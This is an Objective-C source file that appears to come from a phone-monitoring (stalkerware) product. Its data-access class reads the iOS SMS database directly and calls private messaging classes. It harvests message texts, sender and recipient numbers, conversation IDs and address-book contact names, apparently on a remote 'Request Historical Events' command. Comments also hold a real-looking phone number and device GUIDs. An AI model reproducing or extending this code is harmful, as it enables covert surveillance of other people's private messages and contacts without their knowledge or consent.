//
//  SMSCaptureDAO.m
//  SMSCaptureManager
//
//  Created by Makara Khloth on 2/6/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "SMSCaptureDAO.h"
#import "FxSmsEvent.h"
#import "FxRecipient.h"
#import "DefStd.h"
#import "DateTimeFormat.h"
#import "ArrayUtils.h"
#import "FMDatabase.h"
#import "FMResultSet.h"

#import "CKDBMessage.h"
#import "CKDBMessage+IOS6.h"

#import "ABContactsManager.h"

#import <objc/runtime.h>
#import <UIKit/UIKit.h>
#import <Foundation/Foundation.h>

static NSString * const kSelectSMSEventSql1	= @"select ROWID, text, subject, is_from_me, handle_id, cache_roomnames from message where "
													"error = 0 and service = 'SMS' and ROWID not in (select message_id from message_attachment_join) "
													"order by ROWID desc limit %ld";

static NSString * const kSelectSMSEventSql2	= @"select ROWID, text, subject, is_from_me, handle_id, cache_roomnames from message where ROWID = %ld";

static NSString * const kSelectHandleSql	= @"select id, uncanonicalized_id from handle where ROWID = %ld";

static NSString * const kSelectChatSql		= @"select guid from chat where ROWID in (select chat_id from chat_message_join where message_id = %ld)";

#pragma mark Historical Event

static NSString * const kSelectGroupHandleSql		= @"SELECT handle_id "
                                                        "FROM chat_handle_join "
                                                        "WHERE chat_id IN "
                                                            "(SELECT chat_id FROM chat_message_join WHERE message_id = %ld)";

static NSString * const kSelectSMSHistoryWithMax    = @"SELECT ROWID, guid, text, subject, is_from_me, handle_id, date "
                                                        "FROM message "
                                                        "WHERE error = 0        AND "
                                                            "service = 'SMS'    AND "
                                                            "subject is NULL    AND "
                                                            "ROWID NOT IN "
                                                                "(SELECT message_id FROM message_attachment_join) "
                                                        "ORDER BY ROWID DESC LIMIT %ld";

static NSString * const kSelectSMSHistory           = @"SELECT ROWID, guid, text, subject, is_from_me, handle_id, date "
                                                        "FROM message "
                                                        "WHERE error = 0        AND "
                                                            "service = 'SMS'    AND "
                                                            "subject is NULL    AND "
                                                            "ROWID NOT IN "
                                                                "(SELECT message_id FROM message_attachment_join) "
                                                        "ORDER BY ROWID DESC";

@implementation SMSCaptureDAO

- (id) init {
	if ((self = [super init])) {
		mSMSDatabase = [[FMDatabase databaseWithPath:kSMSHistoryDatabasePath] retain];
		[mSMSDatabase open];
	}
	return (self);
}

- (NSArray *) selectSMSEvents: (NSInteger) aNumberOfEvents {
	NSMutableArray *events = [[NSMutableArray alloc] initWithCapacity:aNumberOfEvents];
	NSString *sql1 = [NSString stringWithFormat:kSelectSMSEventSql1, (long)aNumberOfEvents];
	FMResultSet *rs1 = [mSMSDatabase executeQuery:sql1];
	while ([rs1 next]) {
		NSInteger ROWID = [rs1 intForColumnIndex:0];
		NSString *message = [rs1 stringForColumnIndex:1];
		NSString *subject = [rs1 stringForColumnIndex:2];
		BOOL is_from_me = [rs1 intForColumnIndex:3];
		NSInteger handle_id = [rs1 intForColumnIndex:4];
		
		FxSmsEvent *smsEvent = [[FxSmsEvent alloc] init];
		[smsEvent setEventId:ROWID];
		[smsEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[smsEvent setSmsData:message];
		[smsEvent setSmsSubject:subject];
		
		NSString *sql2 = [NSString stringWithFormat:kSelectHandleSql, (long)handle_id];
		FMResultSet *rs2 = [mSMSDatabase executeQuery:sql2];
		NSString *address = nil;
		if ([rs2 next]) {
			address = ([[rs2 stringForColumnIndex:1] length] > 0) ? [rs2 stringForColumnIndex:1] : // uncanonicalized_id
																    [rs2 stringForColumnIndex:0]; // id
		}
		
		NSString *sql3 = [NSString stringWithFormat:kSelectChatSql, (long)ROWID];
		FMResultSet *rs3 = [mSMSDatabase executeQuery:sql3];
		NSString *groupID = nil;
		if ([rs3 next]) {
			groupID = [rs3 stringForColumnIndex:0];
		}
		[smsEvent setMConversationID:groupID];
		
		Class $CKDBMessage = objc_getClass("CKDBMessage");
		CKDBMessage *dbMessage = [[$CKDBMessage alloc] initWithRecordID:(int)ROWID];
		
		DLog (@"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
		DLog (@"CKDBMessage object          = %@", dbMessage);
		DLog (@"address                     = %@", [dbMessage address]);
		DLog (@"text                        = %@", [dbMessage text]);
		DLog (@"subject                     = %@", [dbMessage subject]);
		DLog (@"recipients                  = %@", [dbMessage recipients]);
		DLog (@"isOutgoing                  = %d", [dbMessage isOutgoing]);
		DLog (@"groupid                     = %@", [dbMessage groupID]);			// +66860843742
		DLog (@"guid                        = %@", [dbMessage guid]);				// 7D44F7EB-169E-485E-A209-A65CA8B58295
		DLog (@"madridAccountGUID           = %@", [dbMessage madridAccountGUID]);	// 1A3EAD99-9030-40D1-9290-12222DBFB715
        if ([dbMessage respondsToSelector:@selector(isMessageFullyLoaded)]) {       // Not available in iOS 8
            DLog (@"isMessageFullyLoaded    = %d", [dbMessage isMessageFullyLoaded]);
        }
		DLog (@"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
		
		if (is_from_me) {
			[smsEvent setDirection:kEventDirectionOut];
			
			if (handle_id > 0) { // Outgoing to one recipient
				FxRecipient *recipient = [[FxRecipient alloc] init];
				[recipient setRecipNumAddr:address]; // Contact name will cannot get here
				[recipient setRecipType:kFxRecipientTO];
				[smsEvent addRecipient:recipient];
				[recipient release];
			} else { // Outgoing to multiple recipients				
				for (NSString *recipientNumber in [dbMessage recipients]) {
					FxRecipient *recipient = [[FxRecipient alloc] init];
					[recipient setRecipNumAddr:recipientNumber]; // Contact name will cannot get here
					[recipient setRecipType:kFxRecipientTO];
					[smsEvent addRecipient:recipient];
					[recipient release];
				}
			}
		} else {
			[smsEvent setDirection:kEventDirectionIn];
			[smsEvent setSenderNumber:address]; // Contact name will cannot get here
		}
		
		[dbMessage release];
		
		[events addObject:smsEvent];
		[smsEvent release];
		
		DLog (@"======================================");
		DLog (@"ROWID       = %ld", (long)ROWID);
		DLog (@"message     = %@", message);
		DLog (@"subject     = %@", subject);
		DLog (@"is_from_me  = %d", is_from_me);
		DLog (@"handle_id   = %ld", (long)handle_id);
		DLog (@"address     = %@", address);
		DLog (@"groupID     = %@", groupID);
		DLog (@"======================================");
	}
	NSArray *smsEvents = [ArrayUtils reverseArray:events];
	[events release];
	return (smsEvents);
}

- (FxSmsEvent *) selectSMSEvent: (NSInteger) aROWID {
	FxSmsEvent *smsEvent = nil;
	NSString *sql1 = [NSString stringWithFormat:kSelectSMSEventSql2, (long)aROWID];
	FMResultSet *rs1 = [mSMSDatabase executeQuery:sql1];
	if ([rs1 next]) {
		NSInteger ROWID = [rs1 intForColumnIndex:0];
		NSString *message = [rs1 stringForColumnIndex:1];
		NSString *subject = [rs1 stringForColumnIndex:2];
		BOOL is_from_me = [rs1 intForColumnIndex:3];
		NSInteger handle_id = [rs1 intForColumnIndex:4];
		
		smsEvent = [[[FxSmsEvent alloc] init] autorelease];
		[smsEvent setEventId:ROWID];
		[smsEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[smsEvent setSmsData:message];
		[smsEvent setSmsSubject:subject];
		
		NSString *sql2 = [NSString stringWithFormat:kSelectHandleSql, (long)handle_id];
		FMResultSet *rs2 = [mSMSDatabase executeQuery:sql2];
		NSString *address = nil;
		if ([rs2 next]) {
			address = ([[rs2 stringForColumnIndex:1] length] > 0) ? [rs2 stringForColumnIndex:1] : // uncanonicalized_id
			[rs2 stringForColumnIndex:0]; // id
		}
		
		NSString *sql3 = [NSString stringWithFormat:kSelectChatSql, (long)ROWID];
		FMResultSet *rs3 = [mSMSDatabase executeQuery:sql3];
		NSString *groupID = nil;
		if ([rs3 next]) {
			groupID = [rs3 stringForColumnIndex:0];
		}
		[smsEvent setMConversationID:groupID];
		
		Class $CKDBMessage = objc_getClass("CKDBMessage");
		CKDBMessage *dbMessage = [[$CKDBMessage alloc] initWithRecordID:(int)ROWID];
		
		DLog (@"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
		DLog (@"CKDBMessage object          = %@", dbMessage);
		DLog (@"address                     = %@", [dbMessage address]);
		DLog (@"text                        = %@", [dbMessage text]);
		DLog (@"subject                     = %@", [dbMessage subject]);
		DLog (@"recipients                  = %@", [dbMessage recipients]);
		DLog (@"isOutgoing                  = %d", [dbMessage isOutgoing]);
		DLog (@"groupid                     = %@", [dbMessage groupID]);
		DLog (@"guid                        = %@", [dbMessage guid]);
		DLog (@"madridAccountGUID           = %@", [dbMessage madridAccountGUID]);
        if ([dbMessage respondsToSelector:@selector(isMessageFullyLoaded)]) { // Not available in iOS 8
            DLog (@"isMessageFullyLoaded    = %d", [dbMessage isMessageFullyLoaded]);
        }
		DLog (@"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
		
		if (is_from_me) {
			[smsEvent setDirection:kEventDirectionOut];
			
			if (handle_id > 0) { // Outgoing to one recipient
				FxRecipient *recipient = [[FxRecipient alloc] init];
				[recipient setRecipNumAddr:address]; // Contact name will cannot get here
				[recipient setRecipType:kFxRecipientTO];
				[smsEvent addRecipient:recipient];
				[recipient release];
			} else { // Outgoing to multiple recipients
				for (NSString *recipientNumber in [dbMessage recipients]) {
					FxRecipient *recipient = [[FxRecipient alloc] init];
					[recipient setRecipNumAddr:recipientNumber]; // Contact name will cannot get here
					[recipient setRecipType:kFxRecipientTO];
					[smsEvent addRecipient:recipient];
					[recipient release];
				}
			}
		} else {
			[smsEvent setDirection:kEventDirectionIn];
			[smsEvent setSenderNumber:address]; // Contact name will cannot get here
		}
		
		[dbMessage release];
		
		DLog (@"======================================");
		DLog (@"ROWID       = %ld", (long)ROWID);
		DLog (@"message     = %@", message);
		DLog (@"subject     = %@", subject);
		DLog (@"is_from_me  = %d", is_from_me);
		DLog (@"handle_id   = %ld", (long)handle_id);
		DLog (@"address     = %@", address);
		DLog (@"groupID     = %@", groupID);
		DLog (@"======================================");
	}
	return (smsEvent);
}


#pragma mark - Historical SMS

/*
    This will include SMS command in case the remote command "Request Historical Events"
 */
- (NSArray *) selectAllSMSHistory {
	NSArray *smsLogs       = nil;
    smsLogs = [self selectAllSMSHistoryiOS7iOS8:kSelectSMSHistory];         // Order by date
	return (smsLogs);
}

- (NSArray *) selectAllSMSHistoryWithMax: (NSInteger) aMaxEvent {
    DLog(@"selectAllSMSHistoryWithMax %ld", (long)aMaxEvent)
	NSArray *smsLogs        = nil;
    NSString *sql           = [NSString stringWithFormat:kSelectSMSHistoryWithMax, (long)aMaxEvent];      // Order by date
    DLog(@"SQL iOS 7,8 %@", sql)
    smsLogs                 = [self selectAllSMSHistoryiOS7iOS8:sql];
	return (smsLogs);
}

- (NSString *) contactForAddress: (NSString *) aAddress {
    ABContactsManager *contactManager   = [[ABContactsManager alloc] init];
    aAddress                            = [aAddress stringByReplacingOccurrencesOfString:@"-" withString:@""];
    NSString *contactName               = [contactManager searchFirstNameLastName:aAddress contactID:-1];
    [contactManager release];
    return  contactName;
}

- (NSDate *) dateFromDBDate: (double) aDBDate {
    NSDate *date        = nil;
//    DLog(@"DB Date %@", [NSDate dateWithTimeIntervalSince1970:aDBDate])
//    DLog(@"DB Date %@", [NSDate dateWithTimeIntervalSinceReferenceDate:aDBDate])
//    if ([[[UIDevice currentDevice] systemVersion] intValue] <= 7)
//        date            = [NSDate dateWithTimeIntervalSince1970:aDBDate];
//    else
        date            = [NSDate dateWithTimeIntervalSinceReferenceDate:aDBDate];
    return date;
}

- (NSString *) addressForHandleID: (long) aHandleID {
    NSString *address   = nil;
    NSString *sql2      = [NSString stringWithFormat:kSelectHandleSql, aHandleID];
    FMResultSet *rs2    = [mSMSDatabase executeQuery:sql2];
    if ([rs2 next]) {
        address         = ([[rs2 stringForColumn:@"uncanonicalized_id"] length] > 0) ?
        [rs2 stringForColumn:@"uncanonicalized_id"] :
        [rs2 stringForColumn:@"id"];
    }
    return address;
}

- (NSString *) converIDForROWID: (long) aRowID {
    NSString *groupID   = nil;
    NSString *sql3      = [NSString stringWithFormat:kSelectChatSql, aRowID];
    FMResultSet *rs3    = [mSMSDatabase executeQuery:sql3];
    if ([rs3 next]) {
        groupID         = [rs3 stringForColumnIndex:0];
    }
    return groupID;
}

- (NSArray *) selectAllSMSHistoryiOS7iOS8: (NSString *) aSQL {
    
	NSMutableArray *events  = [[NSMutableArray alloc] init];
    
	FMResultSet *rs1        = [mSMSDatabase executeQuery:aSQL];
    
	while ([rs1 next]) {
        
		NSInteger ROWID     = [rs1 intForColumn:@"ROWID"];
		NSString *message   = [rs1 stringForColumn:@"text"];
		NSString *subject   = [rs1 stringForColumn:@"subject"];
		BOOL is_from_me     = [rs1 intForColumn:@"is_from_me"];
		NSInteger handle_id = [rs1 intForColumn:@"handle_id"];
        NSDate *date        = [self dateFromDBDate:[rs1 doubleForColumn:@"date"]];         // get date and adjust format
        
        // -- Create FxSmsEvent --------------------------
		FxSmsEvent *smsEvent = [[FxSmsEvent alloc] init];
		[smsEvent setEventId:ROWID];
        
        if (date)   [smsEvent setDateTime:[DateTimeFormat dateTimeWithDate:date]];
        else        [smsEvent setDateTime:[DateTimeFormat phoenixDateTime]];
		[smsEvent setSmsData:message];
		[smsEvent setSmsSubject:subject];
		      
        // -- Get address from table "handle"
        NSString *address   = [self addressForHandleID:(long)handle_id];
        
        // -- Get conver id
        NSString *groupID   = [self converIDForROWID:ROWID];
		[smsEvent setMConversationID:groupID];
		
		Class $CKDBMessage = objc_getClass("CKDBMessage");
		CKDBMessage *dbMessage = [[$CKDBMessage alloc] initWithRecordID:(int)ROWID];
		
		DLog (@"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
		DLog (@"CKDBMessage object          = %@", dbMessage);
		DLog (@"address                     = %@", [dbMessage address]);
		DLog (@"text                        = %@", [dbMessage text]);
		DLog (@"subject                     = %@", [dbMessage subject]);
		DLog (@"recipients                  = %@", [dbMessage recipients]);
		DLog (@"isOutgoing                  = %d", [dbMessage isOutgoing]);
		DLog (@"groupid                     = %@", [dbMessage groupID]);			// +66860843742
		DLog (@"guid                        = %@", [dbMessage guid]);				// 7D44F7EB-169E-485E-A209-A65CA8B58295
		DLog (@"madridAccountGUID           = %@", [dbMessage madridAccountGUID]);	// 1A3EAD99-9030-40D1-9290-12222DBFB715
        if ([dbMessage respondsToSelector:@selector(isMessageFullyLoaded)]) {       // Not available in iOS 8
            DLog (@"isMessageFullyLoaded    = %d", [dbMessage isMessageFullyLoaded]);
        }
		DLog (@"+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++");
		
		if (is_from_me) {
            DLog(@"outgoing")
			[smsEvent setDirection:kEventDirectionOut];
			
			if (handle_id > 0) {    // Outgoing to one recipient
				FxRecipient *recipient = [[FxRecipient alloc] init];
				[recipient setRecipNumAddr:address]; // Contact name will cannot get here
				[recipient setRecipType:kFxRecipientTO];
                [recipient setRecipContactName:[self contactForAddress:address]];
                
				[smsEvent addRecipient:recipient];
				[recipient release];
			} else {                // Outgoing to multiple recipients
                DLog(@"+++++ Outgoing to multiple")
                
                // This loop is not executed when the code is exectued with Test App
				for (NSString *recipientNumber in [dbMessage recipients]) {
					FxRecipient *recipient = [[FxRecipient alloc] init];
					[recipient setRecipNumAddr:recipientNumber];
					[recipient setRecipType:kFxRecipientTO];
                    [recipient setRecipContactName:[self contactForAddress:recipientNumber]];
					[smsEvent addRecipient:recipient];
					[recipient release];
				}
                
                DLog(@"!!!!!!! approach %@", [smsEvent recipientArray]);
                /*
                // -- Alternative Approach to get Contact Name
                NSString *sql4      = [NSString stringWithFormat:kSelectGroupHandleSql, (long)ROWID];
                FMResultSet *rs4    = [mSMSDatabase executeQuery:sql4];
                while ([rs4 next]) {
                    DLog(@"recipient address >>>>> %d", [rs4 intForColumn:@"handle_id"])
                    
                    NSInteger handle_id = [rs4 intForColumn:@"handle_id"];
                   
                    // -- Get address from table "handle"
                    NSString *sql5      = [NSString stringWithFormat:kSelectHandleSql, (long)handle_id];
                    FMResultSet *rs5    = [mSMSDatabase executeQuery:sql5];
                    NSString *address   = nil;
                    if ([rs5 next]) {
                        address = ([[rs5 stringForColumn:@"uncanonicalized_id"] length] > 0) ?
                                [rs5 stringForColumn:@"uncanonicalized_id"] :
                                [rs5 stringForColumn:@"id"];
                    }
                    
                   FxRecipient *recipient = [[FxRecipient alloc] init];
					[recipient setRecipNumAddr:address]; // Contact name will cannot get here
					[recipient setRecipType:kFxRecipientTO];
                    [recipient setRecipContactName:[self contactForAddress:address]];
                    
					[smsEvent addRecipient:recipient];
					[recipient release];
                    
                 
                }
                 */

               DLog(@"!!!!!!!! multile recipients for SMS %@", [smsEvent recipientArray])
			}
		} else {
            DLog(@"incoming")
			[smsEvent setDirection:kEventDirectionIn];
			[smsEvent setSenderNumber:address]; // Contact name will cannot get here
            [smsEvent setContactName:[self contactForAddress:address]];                 // Get contact name
		}
		
		[dbMessage release];
		
        // Separate event in case of outgoing to multiple recipients
        if ([[smsEvent recipientArray] count] > 1 && [smsEvent direction] == kEventDirectionOut) {
            NSInteger eventCount = [[smsEvent recipientArray] count];
            for (int i = 0; i < eventCount; i++) {
                DLog(@"recipient %d", i)
                FxSmsEvent *separatedEvent = [[FxSmsEvent alloc] init];
                
                [separatedEvent setEventId:[smsEvent eventId]];
                [separatedEvent setDateTime:[smsEvent dateTime]];
                [separatedEvent setSmsData:[smsEvent smsData]];
                [separatedEvent setSmsSubject:[smsEvent smsSubject]];
                [separatedEvent setMConversationID:[smsEvent mConversationID]];
                [separatedEvent setDirection:[smsEvent direction]];
                [separatedEvent addRecipient:[smsEvent recipientArray][i]];
                DLog(@"sms event recipient %d %@", i, [smsEvent recipientArray][i])
                
                [events addObject:separatedEvent];
                
                [separatedEvent release];
            }
        } else {
            [events addObject:smsEvent];
        }

		[smsEvent release];
		
		DLog (@"======================================");
		DLog (@"ROWID       = %ld", (long)ROWID);
		DLog (@"message     = %@", message);
		DLog (@"subject     = %@", subject);
		DLog (@"is_from_me  = %d", is_from_me);
		DLog (@"handle_id   = %ld", (long)handle_id);
		DLog (@"address     = %@", address);
		DLog (@"groupID     = %@", groupID);
		DLog (@"======================================");
	}
	NSArray *smsEvents = [ArrayUtils reverseArray:events];
	[events release];
    
    DLog(@"ALL SMS EVENTS %@", smsEvents)
	return (smsEvents);
}

#pragma mark -


- (void) dealloc {
	[mSMSDatabase close];
	[mSMSDatabase release];
	[super dealloc];
}

@end
